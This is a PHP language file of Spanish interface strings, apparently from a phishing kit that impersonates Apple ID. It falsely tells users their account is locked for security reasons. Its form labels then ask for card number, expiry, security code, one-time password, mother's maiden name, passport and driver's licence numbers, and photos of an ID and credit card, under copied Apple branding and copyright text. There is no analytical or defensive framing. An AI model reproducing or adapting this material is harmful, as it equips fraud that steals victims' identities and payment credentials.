<?php



###############Homepage##########
$_LANG['SIGNIN'] = "Iniciar sesión";
$_LANG['SIGNUP'] = "Crea tu id de&nbsp;apple";
$_LANG['FORGOT'] = "Olvido la ID o contrasena de&nbsp;Apple?";
$_LANG['TITLE'] = "Tu cuenta para todo Apple.";
$_LANG['TITLE2'] = "Una única identificación y contraseña de Apple le da acceso a todos los servicios de Apple.";
$_LANG['TITLE3'] = "Obtenga más información sobre Apple&nbsp;ID&nbsp;";
###############Signin############
$_LANG['MANAGE'] = "Administre su cuenta de Apple";
$_LANG['PASS'] = "Contraseña";
$_LANG['WRONG'] = "Tu contraseña o identificación de&nbsp;Apple es incorrecta.";
$_LANG['FORGOT'] = "¿Se te olvidó tu contraseña?";
$_LANG['REMMBR'] = "Recuérdame";
$_LANG['PLCHDR'] = "ID de apple";
###############SLEKEK############
$_LANG['REASON'] = "Este ID de Apple ha sido bloqueado por razones de seguridad.";
$_LANG['REASON2'] = "Debes desbloquear tu cuenta antes de iniciar sesión.";
$_LANG['UNLOCKACC'] = "Desbloquear cuenta";
$_LANG['DASHBD'] = "Verificación de la cuenta";
$_LANG['URAPPL'] = "Tu ID de Apple es";
$_LANG['SIGNOUT'] = "Cerrar sesión";
$_LANG['WAIT'] = "Espere mientras restablecemos el acceso a su cuenta ...";
$_LANG['PROVIDE'] = "Por favor, proporcione una foto de su tarjeta de identificación y tarjeta de crédito.";
$_LANG['FORYOUR'] = "Para su seguridad, se cerrará automáticamente. ";
$_LANG['CONFIRM']= "Confirme su identidad";
###############FORM##############
$_LANG['PERSON'] = "Informacion personal";
$_LANG['NAME'] = "NOMBRE";
$_LANG['FN'] = "Nombre de pila";
$_LANG['MN'] = "Segundo nombre (Opcional)";
$_LANG['LN'] = "Apellido";
$_LANG['DOB'] = "Fecha de nacimiento";
$_LANG['PHONE'] = "Teléfono";
$_LANG['PHONENUMB'] = "Número de teléfono";
$_LANG['ADDRESS'] = "Dirección";
$_LANG['CITY'] = "Pueblo / Ciudad";
$_LANG['POSTCODE'] = 'Código postal / postal';
$_LANG['COUNTRY'] = "Detek your country";
$_LANG['COUNTYSELECT'] = '
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="text" name="county" id="county" class="generic-input-field form-control field" placeholder="Estado / Provincia">
</div>
</div>
';
###############ACCDETAILS#######
$_LANG['ACCDET'] = "Detalles de la cuenta";
$_LANG['CARDDET'] = "DETALLES DE TARJETA";
$_LANG['CARDHOLD'] = "Nombre del tarjetahabiente";
$_LANG['CARDNUM'] = "número de tarjeta";
$_LANG['CARDEXP'] = "fecha de caducidad";
$_LANG['CARDCSC'] = "código de Seguridad de la Tarjeta";
$_LANG['CARDOTP'] = "Contraseña de un Solo Uso";
###############SECURITY#########
$_LANG['SECURITY'] = "Seguridad";
$_LANG['QUESSELC'] = "SELECCIONE UNA PREGUNTA DE SEGURIDAD";
$_LANG['MTHRMDN'] = "Nombre de soltera de la madre";
$_LANG['DRVRLCNS'] = "Número de licencia de conducir";
$_LANG['PASSPRT'] = "Número de pasaporte";
$_LANG['ANSWR'] = "responder";
$_LANG['NEXT'] = "Siguiente";
$_LANG['FINISH'] = "Terminar";
##############FOOTER############
$_LANG['FOOTERLINE1'] = "Compre en la tienda en <a href='#'>línea de Apple</a> (0800 048 0408), visite una   <a href='#'>tienda minorista de Apple </a>, o busque <a href='#'>un distribuidor</a>.";
$_LANG['FOOTERLINE21'] = "Información de Apple.";
$_LANG['FOOTERLINE22'] = "Mapa del sitio";
$_LANG['FOOTERLINE23'] = "Noticias de ultimo momento";
$_LANG['FOOTERLINE24'] = "RSS Feeds";
$_LANG['FOOTERLINE25'] = "Contáctenos";
$_LANG['COPYR'] = "Copyright © 2017 Apple Inc. Todos los derechos reservados.";
$_LANG['TERMCN'] = "Términos de Uso";
$_LANG['PRVPLCY'] = "Política de privacidad";
?>